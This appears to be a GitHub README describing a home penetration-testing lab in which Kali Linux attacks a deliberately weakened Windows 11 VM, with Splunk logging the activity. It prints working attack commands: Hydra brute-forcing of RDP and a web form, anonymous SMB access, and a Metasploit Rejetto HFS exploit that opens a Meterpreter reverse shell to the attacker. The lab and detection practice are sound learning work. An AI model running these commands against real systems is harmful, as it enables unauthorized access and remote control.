# Kali x Windows 11 Offensive Security Lab

This project demonstrates a home-based penetration testing lab using Kali Linux (attacker) and Windows 11 (victim). It showcases basic offensive security skills including network scanning, brute-force attacks, exploitation, and log monitoring using Splunk.

---

## Lab Setup

### Machines Used:

| Role      | OS           | Purpose                 |
|-----------|--------------|-------------------------|
| Attacker  | Kali Linux   | Penetration testing     |
| Victim    | Windows 11 | Deliberately misconfigured |

### Virtualization:

- Software: [VirtualBox](https://www.virtualbox.org/)
- Network: Host-only Adapter (192.168.56.0/24)
- SSH/FTP ports exposed locally for testing

---

## Intentional Vulnerabilities on Windows 11

| Vulnerability | Description | Purpose |
|---------------|-------------|---------|
|  Weak RDP Credentials | `john : password` | Allows brute-force over RDP |
|  Public SMB Share | Guest-accessible share with no password | Allows anonymous access or password brute-force |
|  Fake Login Page | PHP login form that logs credentials in plain text | Web-based brute-force target for Hydra |
|  Rejetto HFS v2.3 | Exploitable HTTP file server | Known remote code execution vulnerability |
|  Logging Enabled | Logs forwarded to Splunk | Detection and monitoring of attacks |

---

##  Logging with Splunk

- Installed **Splunk Enterprise** directly on Windows 11
- Logs collected from:
  - Windows Security Logs
  - PowerShell Logs
  - System Logs
  - Sysmon (optional) (was considered but not used in this test — would be useful for deeper process tracing in future setups.)

### Enabled via `gpedit.msc`:
- Audit Logon Events
- Audit Process Tracking
- PowerShell Script Block Logging
- Module Logging
- Transcription

Splunk Web UI accessible at: [http://localhost:8000](http://localhost:8000)

---

##  Attacks Performed from Kali Linux

### 1. Nmap - Network Reconnaissance
**Tool:** `nmap`  
**Command:**
```bash
nmap -sn 192.168.56.0/24
nmap -sC -sV <Windows IP>
```

**Purpose: Identify open ports, services, and OS info. Discovered:**

* Port 80 (HTTP)

* Port 445 (SMB)

* Port 3389 (RDP)

### 2. Hydra - Brute Force Attack
**Brute-force RDP login**

Command:

```bash
hydra -t 4 -V -f -l john -P /usr/share/wordlists/rockyou.txt rdp://<Windows IP>
```
Goal: Test login credentials over RDP. Successfully found weak credentials.

**Web Form Login Attack**

Target: Custom PHP login page hosted on XAMPP (http://<Windows IP>/login.html)

Command:

```bash

hydra -l admin -P /usr/share/wordlists/rockyou.txt <Windows IP> http-post-form "/check.php:username=^USER^&password=^PASS^:Wrong credentials"
```
Result: Hydra successfully cracked default weak login.

## 3. SMB - Anonymous File Share Access
Tool: smbclient

Command:

```bash

smbclient //<Windows IP>/share -N
```
Result: Full access to shared folder with no credentials. Able to read/write files as guest.

## 4. Metasploit - Exploiting Rejetto HFS
Service: Rejetto HTTP File Server v2.3

Tool: metasploit-framework

Exploit Used: exploit/windows/http/rejetto_hfs_exec

Command (inside msfconsole):

```bash
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <Windows IP>
set RPORT 80
set TARGET 0
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <Kali IP>
set LPORT 4444
run
```
Result: Achieved a Meterpreter reverse shell on the Windows 11 machine via known vulnerability in Rejetto HFS v2.3. 
Defender was disabled to ensure stable reverse shell during exploitation.


##  Log Monitoring with Splunk

During all attacks, logs were generated and observed in Splunk:

* Failed/Successful logins (EventCode 4624 / 4625)

* RDP authentication events

* PowerShell activity logs (EventCode 4104)

* Process creation logs (EventCode 4688)

* Metasploit meterpreter sessions (seen via spawned suspicious processes)

Example SPL Queries:

```bash
index=* EventCode=4625
index=* sourcetype=WinEventLog:Security EventCode=4688
index=* source="WinEventLog:Microsoft-Windows-PowerShell/Operational"
```

**What I Learned**

* How to safely simulate and exploit common vulnerabilities

* How to use tools like Nmap, Hydra and metasploit

* How attackers leave traces in system logs

* How to use Splunk to detect unauthorized access

* How to document and present cybersecurity projects professionally

**Next Steps**


* Add more vulnerable services (e.g., MySQL, Redis)

* Try privilege escalation post-exploitation

* Automate some attacks with scripts

* Connect Splunk to a SIEM pipeline 



**Want to collab or ask questions?**

* [LinkedIn](https://www.linkedin.com/in/klaudija-balsyte-60b386251/)

* [Github](https://github.com/shoganaiix)


